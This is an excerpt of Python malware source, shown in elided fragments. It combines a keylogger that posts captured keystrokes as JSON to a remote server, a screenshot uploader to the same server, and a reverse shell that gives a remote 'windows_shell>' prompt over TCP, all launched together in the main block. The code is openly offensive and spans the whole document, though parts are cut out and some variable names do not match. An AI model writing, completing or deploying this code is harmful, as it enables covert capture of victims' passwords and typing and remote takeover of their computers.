...
def __screenshot()->None:
   ...
   with open(IMAGE_NAME, "rb") as fp:
        data = fp.read()
        r2 = requests.post("{url}:{port}/{uri}".format(url=URL,port=HTTP_PORT,uri=URI_IMAGE),data=data)
...
def listen(url:str,uri:str,port:int =80)->None:
  """This function listens for keystrokes until Esc key is pressed
      
    :param url: url of sever(e.g https://example.com)
    :param uri: uri of url, e.g /index.php in  https://example.com/index.php is the the uri
    :param port: TCP destinatoin port, defaults to 80
    :return : None

    Example:
       keylogger.listen("https:example.com","index.php",5000)
       url -> https:example.com:5000/index.php
  """
  
  #Function to send keystrokes in json format via POST request to server
  def send_keystroke():
      if len(__data) > 0:
        json_payload = {"data":"".join(__data)}
        try:
          r = requests.post("{url}:{port}/{uri}".format(url=url,port=port,uri=uri),json=json_payload)
        except:
          #Make sure server is up or URL is correct
          pass
      ...
      #Calls itself each time it is called and waits 3 seconds
...
def tcp_reverse(sock)->None:
    ...
    while True:
          sock.send("windows_shell>".encode())
         ...
         while True:
            try:
               ...
               if command in commands_no_args:
                ...
                s.send("Invalid arguement format, see documentation.\n".encode())         
                pass

if __name__ == "__main__":
    tcp_thread = Thread(target=tcp_connection)
    listenr_thread = Thread(target=listen,args=(URL,URI,HTTP_PORT))
    tcp_thread.start()
